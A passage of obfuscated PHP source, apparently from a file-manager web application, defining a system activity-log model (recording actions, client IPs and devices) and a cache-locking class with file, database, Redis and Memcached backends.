&& $ªĞãÕ´Û[$îÆï”È±[493]] != $ù”Â¹‰Ö[$îÆï”È±[493]]) { return !1; } return parent::update($ù”Â¹‰Ö[$îÆï”È±[493]], $½†íö¶Ü); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\x65\155\137\154\157\147"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\124\x69\155\x65", "\164\x69\155\145", "\x69\x6e\163\x65\162\164", "\x66\x75\x6e\143\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Šó¡º¦¼ =& $_SERVER[¤øïŠ‹²]; return array($Šó¡º¦¼[2503] => LNG($Šó¡º¦¼[2504]), $Šó¡º¦¼[2505] => LNG($Šó¡º¦¼[2506]), $Šó¡º¦¼[2077] => LNG($Šó¡º¦¼[2507]), $Šó¡º¦¼[2508] => LNG($Šó¡º¦¼[2509]), $Šó¡º¦¼[2510] => LNG($Šó¡º¦¼[2511]), $Šó¡º¦¼[2512] => LNG($Šó¡º¦¼[2513]), $Šó¡º¦¼[2514] => LNG($Šó¡º¦¼[2515]), $Šó¡º¦¼[2105] => LNG($Šó¡º¦¼[2515]), $Šó¡º¦¼[2106] => LNG($Šó¡º¦¼[2516]), $Šó¡º¦¼[2517] => LNG($Šó¡º¦¼[2518]), $Šó¡º¦¼[2519] => LNG($Šó¡º¦¼[2520]), $Šó¡º¦¼[2521] => LNG($Šó¡º¦¼[2522]), $Šó¡º¦¼[2523] => LNG($Šó¡º¦¼[2524]), $Šó¡º¦¼[2103] => LNG($Šó¡º¦¼[2525]), $Šó¡º¦¼[2526] => LNG($Šó¡º¦¼[2527]), $Šó¡º¦¼[2110] => LNG($Šó¡º¦¼[2528]), $Šó¡º¦¼[2529] => LNG($Šó¡º¦¼[2530]), $Šó¡º¦¼[2531] => LNG($Šó¡º¦¼[2532]), $Šó¡º¦¼[2533] => LNG($Šó¡º¦¼[2534]), $Šó¡º¦¼[2535] => LNG($Šó¡º¦¼[2536]), $Šó¡º¦¼[2112] => LNG($Šó¡º¦¼[2537]), $Šó¡º¦¼[2113] => LNG($Šó¡º¦¼[2538]), $Šó¡º¦¼[2539] => LNG($Šó¡º¦¼[2540]), $Šó¡º¦¼[2541] => LNG($Šó¡º¦¼[2542]), $Šó¡º¦¼[2543] => LNG($Šó¡º¦¼[2544]), $Šó¡º¦¼[2108] => LNG($Šó¡º¦¼[2545]), $Šó¡º¦¼[2546] => LNG($Šó¡º¦¼[2547]), $Šó¡º¦¼[2107] => LNG($Šó¡º¦¼[2548]), $Šó¡º¦¼[2549] => LNG($Šó¡º¦¼[2549]), $Šó¡º¦¼[2550] => LNG($Šó¡º¦¼[2551]), $Šó¡º¦¼[2552] => LNG($Šó¡º¦¼[2549]), $Šó¡º¦¼[2553] => LNG($Šó¡º¦¼[2554]), $Šó¡º¦¼[2555] => LNG($Šó¡º¦¼[2556]), $Šó¡º¦¼[2557] => LNG($Šó¡º¦¼[2556]), $Šó¡º¦¼[2558] => LNG($Šó¡º¦¼[2559]), $Šó¡º¦¼[2560] => LNG($Šó¡º¦¼[2560]), $Šó¡º¦¼[2561] => LNG($Šó¡º¦¼[2081]), $Šó¡º¦¼[2562] => LNG($Šó¡º¦¼[2563]), $Šó¡º¦¼[2564] => LNG($Šó¡º¦¼[2565]), $Šó¡º¦¼[2566] => LNG($Šó¡º¦¼[2567]), $Šó¡º¦¼[2568] => LNG($Šó¡º¦¼[2569]), $Šó¡º¦¼[2570] => LNG($Šó¡º¦¼[2571]), $Šó¡º¦¼[2572] => LNG($Šó¡º¦¼[2572]), $Šó¡º¦¼[2573] => LNG($Šó¡º¦¼[2574]), $Šó¡º¦¼[2575] => LNG($Šó¡º¦¼[2576]), $Šó¡º¦¼[2577] => LNG($Šó¡º¦¼[2578]), $Šó¡º¦¼[2579] => LNG($Šó¡º¦¼[2580]), $Šó¡º¦¼[2581] => LNG($Šó¡º¦¼[2582]), $Šó¡º¦¼[2583] => LNG($Šó¡º¦¼[2584]), $Šó¡º¦¼[223] => LNG($Šó¡º¦¼[223]), $Šó¡º¦¼[224] => LNG($Šó¡º¦¼[2585]), $Šó¡º¦¼[2586] => LNG($Šó¡º¦¼[2586])); } private function typeFile() { $üŠõÃü˜ =& $_SERVER[¤øïŠ‹²]; $ÙÕËµò´ = array($üŠõÃü˜[2110] => array($üŠõÃü˜[2111]), $üŠõÃü˜[2521] => array($üŠõÃü˜[2587]), $üŠõÃü˜[2523] => array($üŠõÃü˜[2588]), $üŠõÃü˜[2103] => array($üŠõÃü˜[2104], $üŠõÃü˜[2589]), $üŠõÃü˜[2531] => array(), $üŠõÃü˜[2533] => array(), $üŠõÃü˜[2535] => array(), $üŠõÃü˜[2112] => array($üŠõÃü˜[2114]), $üŠõÃü˜[2113] => array($üŠõÃü˜[2114]), $üŠõÃü˜[2539] => array($üŠõÃü˜[2590]), $üŠõÃü˜[2541] => array($üŠõÃü˜[2590]), $üŠõÃü˜[2543] => array($üŠõÃü˜[2591]), $üŠõÃü˜[2529] => array($üŠõÃü˜[2592]), $üŠõÃü˜[2108] => array($üŠõÃü˜[2593]), $üŠõÃü˜[2546] => array($üŠõÃü˜[2594]), $üŠõÃü˜[2107] => array($üŠõÃü˜[2109])); return $ÙÕËµò´; } private function typeAll() { $˜ú¨ÈŒÄ =& $_SERVER[¤øïŠ‹²]; $Æ±¾ğšÀ = $this->typeList; $üÙ€ğ¾Ö = array_filter($this->typeFile()); foreach ($üÙ€ğ¾Ö as $‰î•¡îÕ => $‡Ïèëû¥) { $Æ±¾ğšÀ[$‡Ïèëû¥[0]] = $Æ±¾ğšÀ[$‰î•¡îÕ]; } $Æ±¾ğšÀ[$˜ú¨ÈŒÄ[2114]] = LNG($˜ú¨ÈŒÄ[2595]); $Æ±¾ğšÀ[$˜ú¨ÈŒÄ[2590]] = LNG($˜ú¨ÈŒÄ[2596]); return $Æ±¾ğšÀ; } public function addLog($ŸğµÊ–‘, $øÚ ±ÀÌ = array()) { $üÁüíéë =& $_SERVER[¤øïŠ‹²]; if (!isset($this->typeList[$ŸğµÊ–‘])) { return; } $øŒ©™·å = Session::get($üÁüíéë[2268]); if (!$øŒ©™·å) { $øŒ©™·å = _get($øÚ ±ÀÌ, $üÁüíéë[1542], 0); } if ($ŸğµÊ–‘ == $üÁüíéë[2562] && is_array($øÚ ±ÀÌ[$üÁüíéë[2597]]) && !$øÚ ±ÀÌ[$üÁüíéë[2597]]) { return; } $ä”“Ášœ = get_client_ip(); if (!$øÚ ±ÀÌ || strlen(json_encode($øÚ ±ÀÌ)) >= 1024 * 64) { if ($øÚ ±ÀÌ && is_array($øÚ ±ÀÌ)) { $øÚ ±ÀÌ = array_intersect_key($øÚ ±ÀÌ, array_flip($üÁüíéë[493], $üÁüíéë[32])); $øÚ ±ÀÌ[$üÁüíéë[1558]] = $ä”“Ášœ; } else { $øÚ ±ÀÌ = array($üÁüíéë[1558] => $ä”“Ášœ); } } else { if (is_array($øÚ ±ÀÌ)) { $øÚ ±ÀÌ[$üÁüíéë[1558]] = $ä”“Ášœ; } else { $øÚ ±ÀÌ = array($üÁüíéë[1339] => $øÚ ±ÀÌ, $üÁüíéë[1558] => $ä”“Ášœ); } } $øÚ ±ÀÌ[$üÁüíéë[2598]] = ACTION; $øÚ ±ÀÌ = array($üÁüíéë[1915] => Session::sign(), $üÁüíéë[1916] => intval($øŒ©™·å), $üÁüíéë[33] => $ŸğµÊ–‘, $üÁüíéë[1918] => json_encode($øÚ ±ÀÌ)); Hook::trigger($üÁüíéë[2599], $øÚ ±ÀÌ); return parent::add($øÚ ±ÀÌ); } public function remove($÷šÚ¯ûè) { $this->where(array($_SERVER[¤øïŠ‹²][514] => $÷šÚ¯ûè))->delete(); } private function _makeOrder($ì…ƒ‘İõ = '') { $øÑ²ÑËŸ =& $_SERVER[¤øïŠ‹²]; $ç¯êñÇ = $øÑ²ÑËŸ[244]; $ùŠ½°Ö = array($øÑ²ÑËŸ[543] => $øÑ²ÑËŸ[544], $øÑ²ÑËŸ[545] => $øÑ²ÑËŸ[546]); $•»Ê†² = Input::get($øÑ²ÑËŸ[551], $øÑ²ÑËŸ[7], $øÑ²ÑËŸ[2306], array($øÑ²ÑËŸ[2224], $øÑ²ÑËŸ[545])); $•»Ê†² = $ùŠ½°Ö[$•»Ê†²]; $ì…ƒ‘İõ = $ì…ƒ‘İõ . "{$ç¯êñÇ}\40{$•»Ê†²}"; return $this->order($ì…ƒ‘İõ); } public function get($²Ç­öÃ¥ = '') { $û÷éğ…² =& $_SERVER[¤øïŠ‹²]; if (!$²Ç­öÃ¥) { show_json(array()); } $Ùå™§† = array(); if ($²Ç­öÃ¥[$û÷éğ…²[1542]]) { $Ùå™§†[$û÷éğ…²[1542]] = $²Ç­öÃ¥[$û÷éğ…²[1542]]; } if (isset($²Ç­öÃ¥[$û÷éğ…²[862]])) { $Ïû†—„ = $²Ç­öÃ¥[$û÷éğ…²[862]]; $¶‰¯ÌŒò = isset($²Ç­öÃ¥[$û÷éğ…²[863]]) ? $²Ç­öÃ¥[$û÷éğ…²[863]] : time(); $Ùå™§†[$û÷éğ…²[244]] = array($û÷éğ…²[420], array($Ïû†—„, $¶‰¯ÌŒò)); } if ($²Ç­öÃ¥[$û÷éğ…²[33]]) { $«Õ×ö†ò = explode($û÷éğ…²[50], $²Ç­öÃ¥[$û÷éğ…²[33]]); $ø×Í¢¸— = $this->typeFile(); $—®ìÌ” = array(); foreach ($«Õ×ö†ò as $€—ğºÎš) { $—®ìÌ”[] = $€—ğºÎš; if (isset($ø×Í¢¸—[$€—ğºÎš])) { $—®ìÌ” = array_merge($—®ìÌ”, $ø×Í¢¸—[$€—ğºÎš]); } } $—®ìÌ” = array_unique($—®ìÌ”); if ($—®ìÌ”) { $Ùå™§†[$û÷éğ…²[33]] = array($û÷éğ…²[7], $—®ìÌ”); } } else { $Ùå™§†[$û÷éğ…²[33]] = array($û÷éğ…²[2600], $û÷éğ…²[2601]); } if (!empty($²Ç­öÃ¥[$û÷éğ…²[1558]])) { $Ùå™§†[$û÷éğ…²[546]] = array($û÷éğ…²[480], "\x25{$²Ç­öÃ¥[$û÷éğ…²[1558]]}\x25"); } $×í¹‚Ï¥ = $this->_makeOrder()->where($Ùå™§†)->selectPage(); if (empty($×í¹‚Ï¥[$û÷éğ…²[457]])) { show_json(array(), !0, $×í¹‚Ï¥[$û÷éğ…²[454]]); } $×í¹‚Ï¥[$û÷éğ…²[457]] = $this->logList($×í¹‚Ï¥[$û÷éğ…²[457]]); return $×í¹‚Ï¥; } private function ipAddress(&$˜ãÄ”ºÅ) { $ùö¬íùÎ =& $_SERVER[¤øïŠ‹²]; if (!empty($˜ãÄ”ºÅ[$ùö¬íùÎ[1558]])) { $’ë©üÅÉ = IpLocation::get($˜ãÄ”ºÅ[$ùö¬íùÎ[1558]]); } else { $’ë©üÅÉ = LNG($ùö¬íùÎ[2602]); } $˜ãÄ”ºÅ[$ùö¬íùÎ[2603]] = $’ë©üÅÉ; } private function descZipDownload($‘Éı´û, &$˜µ°“·») { $Š­¨û¥¹ =& $_SERVER[¤øïŠ‹²]; if (!isset($‘Éı´û[$Š­¨û¥¹[1565]])) { return; } $İ•´–Ô„ = json_decode($‘Éı´û[$Š­¨û¥¹[1565]], !0); foreach ($İ•´–Ô„ as $ßµÊ÷Å) { try { $™ßĞöÒ = IO::infoFullSimple($ßµÊ÷Å[$Š­¨û¥¹[98]]); } catch (Exception $è±ñõ¡‰) { continue; } $‘Éı´û[$Š­¨û¥¹[98]] = $ßµÊ÷Å[$Š­¨û¥¹[98]]; $˜µ°“·»[] = $‘Éı´û[$Š­¨û¥¹[204]] = $™ßĞöÒ[$Š­¨û¥¹[204]]; $˜µ°“·»[] = $‘Éı´û[$Š­¨û¥¹[2366]] = $™ßĞöÒ[$Š­¨û¥¹[203]]; break; } return $‘Éı´û; } private function getSourceList(&$ØÓªÎ³Ü) { $ù‚´í¬ =& $_SERVER[¤øïŠ‹²]; $¸†êí¤ = array(); foreach ($ØÓªÎ³Ü as $ÌŠœ•¶š => $ÙŸÙ—Ë€) { $ˆè×ÂÎ¸ = json_decode($ÙŸÙ—Ë€[$ù‚´í¬[546]], !0); if ($ÙŸÙ—Ë€[$ù‚´í¬[33]] == $ù‚´í¬[2106]) { $ˆè×ÂÎ¸ = $this->descZipDownload($ˆè×ÂÎ¸, $¸†êí¤); $ØÓªÎ³Ü[$ÌŠœ•¶š][$ù‚´í¬[546]] = json_encode($ˆè×ÂÎ¸); continue; } if (strpos($ÙŸÙ—Ë€[$ù‚´í¬[33]], $ù‚´í¬[2368]) !== 0) { if (!isset($ˆè×ÂÎ¸[$ù‚´í¬[98]]) || strpos($ÙŸÙ—Ë€[$ù‚´í¬[33]], $ù‚´í¬[2604]) !== 0) { continue; } try { $ïÙì€Û = IO::infoFullSimple($ˆè×ÂÎ¸[$ù‚´í¬[98]]); } catch (Exception $·¡”ó…Â) { continue; } $¸†êí¤[] = $ˆè×ÂÎ¸[$ù‚´í¬[204]] = $ïÙì€Û[$ù‚´í¬[204]]; $¸†êí¤[] = $ˆè×ÂÎ¸[$ù‚´í¬[2366]] = $ïÙì€Û[$ù‚´í¬[203]]; $ØÓªÎ³Ü[$ÌŠœ•¶š][$ù‚´í¬[546]] = json_encode($ˆè×ÂÎ¸); continue; } $¸†êí¤[] = $ˆè×ÂÎ¸[$ù‚´í¬[204]]; $¸†êí¤[] = $ˆè×ÂÎ¸[$ù‚´í¬[2366]]; if ($ˆè×ÂÎ¸[$ù‚´í¬[33]] == $ù‚´í¬[649]) { $¸†êí¤[] = $ˆè×ÂÎ¸[$ù‚´í¬[546]][$ù‚´í¬[1292]]; $¸†êí¤[] = $ˆè×ÂÎ¸[$ù‚´í¬[546]][$ù‚´í¬[1293]]; } if ($ˆè×ÂÎ¸[$ù‚´í¬[33]] == $ù‚´í¬[2376]) { $¸†êí¤[] = $ˆè×ÂÎ¸[$ù‚´í¬[546]][$ù‚´í¬[204]]; } } if (!$¸†êí¤) { return array(); } return Model($ù‚´í¬[934])->sourceListInfo($¸†êí¤, !0); } private function logList($Ñ”¼Ü) { $âƒ›ÛÉ =& $_SERVER[¤øïŠ‹²]; $æñ®®íä = array_to_keyvalue($Ñ”¼Ü, $âƒ›ÛÉ[12], $âƒ›ÛÉ[1542]); $…ÏÊ–· = Model($âƒ›ÛÉ[623])->userListInfo(array_unique($æñ®®íä)); $¨¥ÒÆÔ¢ = $this->getSourceList($Ñ”¼Ü); $şÇ½È…æ = $this->typeAll(); $æçíÕ•º = array(); $İÑŸßĞÖ = array(); foreach ($Ñ”¼Ü as $Ñàœ£õú => $ŸÍ¶óËÀ) { $Áå˜–çš = $ŸÍ¶óËÀ[$âƒ›ÛÉ[33]]; $™áö°ï = isset($…ÏÊ–·[$ŸÍ¶óËÀ[$âƒ›ÛÉ[1542]]]) ? $…ÏÊ–·[$ŸÍ¶óËÀ[$âƒ›ÛÉ[1542]]] : !1; $ºìîæªº = strpos($Áå˜–çš, $âƒ›ÛÉ[2605]) === 0 ? LNG($âƒ›ÛÉ[2606]) : LNG($âƒ›ÛÉ[2602]); $ŸÍ¶óËÀ[$âƒ›ÛÉ[32]] = isset($™áö°ï[$âƒ›ÛÉ[32]]) ? $™áö°ï[$âƒ›ÛÉ[32]] : LNG($âƒ›ÛÉ[2602]); $ŸÍ¶óËÀ[$âƒ›ÛÉ[2427]] = isset($™áö°ï[$âƒ›ÛÉ[2427]]) ? $™áö°ï[$âƒ›ÛÉ[2427]] : $âƒ›ÛÉ[12]; $ŸÍ¶óËÀ[$âƒ›ÛÉ[1813]] = isset($şÇ½È…æ[$Áå˜–çš]) ? $şÇ½È…æ[$Áå˜–çš] : $ºìîæªº; $ŸÍ¶óËÀ[$âƒ›ÛÉ[2305]] = $™áö°ï; $æÀ¹å–µ = json_decode($ŸÍ¶óËÀ[$âƒ›ÛÉ[546]], !0); $ŸÍ¶óËÀ[$âƒ›ÛÉ[1558]] = isset($æÀ¹å–µ[$âƒ›ÛÉ[1558]]) ? $æÀ¹å–µ[$âƒ›ÛÉ[1558]] : $âƒ›ÛÉ[12]; $ŸÍ¶óËÀ[$âƒ›ÛÉ[2603]] = IpLocation::get($ŸÍ¶óËÀ[$âƒ›ÛÉ[1558]]); if (strpos($Áå˜–çš, $âƒ›ÛÉ[2368]) === 0 || isset($æÀ¹å–µ[$âƒ›ÛÉ[2366]])) { $æÀ¹å–µ[$âƒ›ÛÉ[101]] = $¨¥ÒÆÔ¢[$æÀ¹å–µ[$âƒ›ÛÉ[204]]]; $æÀ¹å–µ[$âƒ›ÛÉ[2381]] = $¨¥ÒÆÔ¢[$æÀ¹å–µ[$âƒ›ÛÉ[2366]]]; if ($æÀ¹å–µ[$âƒ›ÛÉ[33]] == $âƒ›ÛÉ[649]) { $æÀ¹å–µ[$âƒ›ÛÉ[546]][$âƒ›ÛÉ[1292]] = $¨¥ÒÆÔ¢[$æÀ¹å–µ[$âƒ›ÛÉ[546]][$âƒ›ÛÉ[1292]]]; $æÀ¹å–µ[$âƒ›ÛÉ[546]][$âƒ›ÛÉ[1293]] = $¨¥ÒÆÔ¢[$æÀ¹å–µ[$âƒ›ÛÉ[546]][$âƒ›ÛÉ[1293]]]; } if ($æÀ¹å–µ[$âƒ›ÛÉ[33]] == $âƒ›ÛÉ[2376]) { $æÀ¹å–µ[$âƒ›ÛÉ[546]][$âƒ›ÛÉ[204]] = $¨¥ÒÆÔ¢[$æÀ¹å–µ[$âƒ›ÛÉ[546]][$âƒ›ÛÉ[204]]]; } if ($æÀ¹å–µ[$âƒ›ÛÉ[33]] == $âƒ›ÛÉ[1280]) { $æÀ¹å–µ[$âƒ›ÛÉ[2381]] = $æÀ¹å–µ[$âƒ›ÛÉ[101]]; $æÀ¹å–µ[$âƒ›ÛÉ[2366]] = $æÀ¹å–µ[$âƒ›ÛÉ[2381]][$âƒ›ÛÉ[204]]; $æÀ¹å–µ[$âƒ›ÛÉ[101]] = !1; $æÀ¹å–µ[$âƒ›ÛÉ[204]] = $âƒ›ÛÉ[12]; } $¨Šãğ = array($âƒ›ÛÉ[1280], $âƒ›ÛÉ[2364]); if (!in_array($æÀ¹å–µ[$âƒ›ÛÉ[33]], $¨Šãğ)) { if ($æÀ¹å–µ[$âƒ›ÛÉ[101]] && $æÀ¹å–µ[$âƒ›ÛÉ[101]][$âƒ›ÛÉ[201]] == $âƒ›ÛÉ[202]) { $İÑŸßĞÖ[] = $ŸÍ¶óËÀ[$âƒ›ÛÉ[493]]; unset($Ñ”¼Ü[$Ñàœ£õú]); continue; } if ($æÀ¹å–µ[$âƒ›ÛÉ[2381]] && $æÀ¹å–µ[$âƒ›ÛÉ[2381]][$âƒ›ÛÉ[201]] == $âƒ›ÛÉ[202]) { $İÑŸßĞÖ[] = $ŸÍ¶óËÀ[$âƒ›ÛÉ[493]]; unset($Ñ”¼Ü[$Ñàœ£õú]); continue; } } } $ŸÍ¶óËÀ[$âƒ›ÛÉ[546]] = $æÀ¹å–µ; unset($ŸÍ¶óËÀ[$âƒ›ÛÉ[2607]]); $æçíÕ•º[] = $ŸÍ¶óËÀ; } $this->clearSystemPathLog($İÑŸßĞÖ); return $æçíÕ•º; } private function clearSystemPathLog($öş×æ¤İ) { $·ïñëËİ =& $_SERVER[¤øïŠ‹²]; if (count($öş×æ¤İ) == 0) { return; } $óÕè’© = array($·ïñëËİ[493] => array($·ïñëËİ[7], array_unique($öş×æ¤İ))); $this->where($óÕè’©)->delete(); } public function deviceList($ëÈëÒÆÔ, $¼§ì–¾ = 0) { $É£Øßß =& $_SERVER[¤øïŠ‹²]; $ˆùÜ­Â¹ = array($É£Øßß[1542] => $ëÈëÒÆÔ, $É£Øßß[244] => array($É£Øßß[1130], $¼§ì–¾), $É£Øßß[33] => $É£Øßß[2077]); $ºÆòà´ = array(); $ÙÒı¶â = $this->field($É£Øßß[2608])->where($ˆùÜ­Â¹)->order($É£Øßß[2379])->limit(50)->select(); foreach ($ÙÒı¶â as $¨×‡È‘Á => $³Åö³°µ) { if ($¨×‡È‘Á > 0 && abs($³Åö³°µ[$É£Øßß[244]] - $ÙÒı¶â[$¨×‡È‘Á - 1][$É£Øßß[244]]) < 5) { continue; } $¨ÛÒ­ÆĞ = json_decode($³Åö³°µ[$É£Øßß[546]], !0); $³Åö³°µ[$É£Øßß[1558]] = isset($¨ÛÒ­ÆĞ[$É£Øßß[1558]]) ? $¨ÛÒ­ÆĞ[$É£Øßß[1558]] : $É£Øßß[12]; unset($¨ÛÒ­ÆĞ[$É£Øßß[1558]]); $ƒê£µ˜ = $this->deviceType($¨ÛÒ­ÆĞ[$É£Øßß[2369]]); if (isset($ºÆòà´[$ƒê£µ˜])) { continue; } $³Åö³°µ[$É£Øßß[2603]] = IpLocation::get($³Åö³°µ[$É£Øßß[1558]]); $³Åö³°µ[$É£Øßß[546]] = $¨ÛÒ­ÆĞ; $ºÆòà´[$ƒê£µ˜] = $³Åö³°µ; } return array_values($ºÆòà´); } public function deviceType($³¹¸ïèè) { return $³¹¸ïèè; } } goto dá¨ƒå°’ó; d›ê·çÍ«‰: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¿›Ï¥ˆ =& $_SERVER[¤øïŠ‹²]; if (self::$handle) { return self::$handle; } $œàÔòˆº = $GLOBALS[$¿›Ï¥ˆ[6]][$¿›Ï¥ˆ[436]]; self::$timeout = $œàÔòˆº[$¿›Ï¥ˆ[953]] ? $œàÔòˆº[$¿›Ï¥ˆ[953]] : 10; $éˆØÜ²Ñ = _get($GLOBALS[$¿›Ï¥ˆ[6]], $¿›Ï¥ˆ[954]); $³ŞêÜ ¹ = $œàÔòˆº[$¿›Ï¥ˆ[936]] ? $œàÔòˆº[$¿›Ï¥ˆ[936]] : $¿›Ï¥ˆ[243]; if ($³ŞêÜ ¹ == $¿›Ï¥ˆ[21] && $éˆØÜ²Ñ == $¿›Ï¥ˆ[13]) { $³ŞêÜ ¹ = $¿›Ï¥ˆ[243]; } switch ($³ŞêÜ ¹) { case $¿›Ï¥ˆ[939]: self::$handle = new CacheLockRedis(); break; case $¿›Ï¥ˆ[940]: self::$handle = new CacheLockMemcached(); break; case $¿›Ï¥ˆ[21]: self::$handle = new CacheLockDatabase(); break; case $¿›Ï¥ˆ[243]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¿›Ï¥ˆ[955], $¿›Ï¥ˆ[956]); } return self::$handle; } private static function key($‹ş¥¯üë) { return $_SERVER[¤øïŠ‹²][957] . Cache::key($‹ş¥¯üë); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¦û«šÌ = '') { self::$errorMsg = $¦û«šÌ; } public static function lockGlobal($Š”©çšÅ, $»³ñØüÀ) { return self::lock($Š”©çšÅ, $»³ñØüÀ, !0); } public static function lock($ÍØÊîÉê, $ï×¹½ƒ¤ = false, $Õ¾¸¶° = false) { $×÷î™Û´ =& $_SERVER[¤øïŠ‹²]; $®û§ßÍÆ = self::init(); $½Ö‰Ä¿¿ = self::key($ÍØÊîÉê); $ï×¹½ƒ¤ = $ï×¹½ƒ¤ ? $ï×¹½ƒ¤ : self::$timeout; $ŒŠöÎÃ” = timeFloat(); if (_get($GLOBALS, $×÷î™Û´[958], !1)) { if (!$®û§ßÍÆ->lock($½Ö‰Ä¿¿, 0.2)) { die; } return !0; } $±ÀàØ¨Ã = $®û§ßÍÆ->lock($½Ö‰Ä¿¿, $ï×¹½ƒ¤); $ÓÕÑñ©– = timeFloat(); if (!$±ÀàØ¨Ã) { $êğÑÑ— = "\154\x6f\143\x6b\40\x65\162\x72\x6f\x72\x3b\x6b\x65\171\x3d{$ÍØÊîÉê}\73\x74\151\x6d\145\75{$ï×¹½ƒ¤}\73" . self::$errorMsg . $×÷î™Û´[85] . get_caller_msg(); $­å‰Ê’ = LNG($×÷î™Û´[959]) . "\x28{$ï×¹½ƒ¤}\163\51\x2e" . LNG($×÷î™Û´[960]); $­å‰Ê’ .= $×÷î™Û´[961]; if (is_string(self::$errorMsg) && self::$errorMsg) { $­å‰Ê’ = $­å‰Ê’ . $×÷î™Û´[962] . self::$errorMsg; } write_log($×÷î™Û´[963] . sprintf($×÷î™Û´[964], timeFloat() - $ŒŠöÎÃ”) . $×÷î™Û´[965] . $êğÑÑ— . $×÷î™Û´[966] . json_encode(error_get_last()), $×÷î™Û´[956]); show_json($­å‰Ê’, !1); } if (!$Õ¾¸¶°) { self::$lockItem[$½Ö‰Ä¿¿] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ÜôÒÆÇ = number_format(timeFloat() - $ÓÕÑñ©–, 3); write_log($×÷î™Û´[967] . $ÍØÊîÉê . $×÷î™Û´[968] . $ÜôÒÆÇ, $×÷î™Û´[956]); } return $±ÀàØ¨Ã; } public static function lockGet($ôÇğ×æ˜) { $°«Ú‰é = self::key($ôÇğ×æ˜); if (self::$lockItem[$°«Ú‰é]) { return self::$lockItem[$°«Ú‰é]; } return self::init()->lockGet($°«Ú‰é); } public static function unlock($ï˜µ²Ğ¸) { $ìÅé„ğ =& $_SERVER[¤øïŠ‹²]; $˜±€¼®Û = self::key($ï˜µ²Ğ¸); self::$lockItem[$˜±€¼®Û] = null; self::init()->unlock($˜±€¼®Û); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ìÅé„ğ[969] . $ï˜µ²Ğ¸, $ìÅé„ğ[956]); } return; } public static function unlockRuntime() { $±Ò’’àó =& $_SERVER[¤øïŠ‹²]; $˜Ø°ùæ… = self::init(); $é£úè¿¿ = !1; foreach (self::$lockItem as $‘„á›×˜ => $²¡¼“˜µ) { if (!$²¡¼“˜µ) { continue; } $˜Ø°ùæ…->unlock($‘„á›×˜); if (!$é£úè¿¿) { $é£úè¿¿ = !0; write_log($±Ò’’àó[970] . $‘„á›×˜ . $±Ò’’àó[85] . get_caller_msg(), $±Ò’’àó[956]); continue; } write_log($±Ò’’àó[970] . $‘„á›×˜, $±Ò’’àó[956]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¾¦éÑÑ÷ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($±Ò’’àó[971] . $¾¦éÑÑ÷ . $±Ò’’àó[972] . ACTION, $±Ò’’àó[956]); } } public static function fileLock($Ä¸©˜ºÖ) { $Ä÷¡ã‡Ä =& $_SERVER[¤øïŠ‹²]; if (!$GLOBALS[$Ä÷¡ã‡Ä[973]]) { $GLOBALS[$Ä÷¡ã‡Ä[973]] = array(); } $GLOBALS[$Ä÷¡ã‡Ä[973]][$Ä¸©˜ºÖ] = !1; $ÃæÈ®÷Ê = fopen(DATA_PATH . $Ä¸©˜ºÖ . $Ä÷¡ã‡Ä[974], $Ä÷¡ã‡Ä[975]); if (!$ÃæÈ®÷Ê) { return !1; } $GLOBALS[$Ä÷¡ã‡Ä[973]][$Ä¸©˜ºÖ] = $ÃæÈ®÷Ê; if (flock($ÃæÈ®÷Ê, LOCK_EX)) { return !0; } self::unlock($Ä¸©˜ºÖ); show_json($Ä÷¡ã‡Ä[976], !1); return !1; } public static function fileUnlock($ú§ÏÌüù) { $›ï¦Ğå… =& $_SERVER[¤øïŠ‹²]; $ç¯øëû = $GLOBALS[$›ï¦Ğå…[973]][$ú§ÏÌüù]; if (!$ç¯øëû) { return; } $GLOBALS[$›ï¦Ğå…[973]][$ú§ÏÌüù] = !1; flock($ç¯øëû, LOCK_UN); fclose($ç¯øëû); } public static function fileUnlockAll() { $‘ßˆĞ¾÷ =& $_SERVER[¤øïŠ‹²]; if (!isset($GLOBALS[$‘ßˆĞ¾÷[973]]) || !$GLOBALS[$‘ßˆĞ¾÷[973]]) { return; } foreach ($GLOBALS[$‘ßˆĞ¾÷[973]] as $¤ş©ÆÀ => $Œòûß¢Á) { if (!$Œòûß¢Á) { continue; } $GLOBALS[$‘ßˆĞ¾÷[973]][$¤ş©ÆÀ] = !1; flock($Œòûß¢Á, LOCK_UN); fclose($Œòûß¢Á); } $GLOBALS[$‘ßˆĞ¾÷[973]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $èÆëÊ˜Ø =& $_SERVER[¤øïŠ‹²]; $ã¨±¥ÅË = $GLOBALS[$èÆëÊ˜Ø[6]][$èÆëÊ˜Ø[436]]; self::$cachePath = $ã¨±¥ÅË[$èÆëÊ˜Ø[243]][$èÆëÊ˜Ø[98]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ñ´ÏºÔ, $ÉƒĞ‡‡¤ = 0) { $æØğÖ­Ş =& $_SERVER[¤øïŠ‹²]; $®¼€æø¯ = microtime(!0); $Ñ°ş¯Íè = $®¼€æø¯ + $ÉƒĞ‡‡¤ + 0.0001; $†ÍÏå½ = rtrim(self::$cachePath, $æØğÖ­Ş[8]) . $æØğÖ­Ş[977] . md5($Ñ´ÏºÔ) . $æØğÖ­Ş[974]; if (file_exists($†ÍÏå½) && filemtime($†ÍÏå½) && filemtime($†ÍÏå½) < time() - 10) { @unlink($†ÍÏå½); } do { if (file_exists($†ÍÏå½)) { cacheLockWait(); continue; } $÷óòË® = fopen($†ÍÏå½, $æØğÖ­Ş[978]); if (!$÷óòË®) { return !1; } $äéõÍùĞ = flock($÷óòË®, LOCK_EX | LOCK_NB); self::$caches[$Ñ´ÏºÔ] = array($æØğÖ­Ş[979] => $÷óòË®, $æØğÖ­Ş[243] => $†ÍÏå½); fwrite($÷óòË®, $Ñ°ş¯Íè); clearstatcache(); if ($÷óòË® && 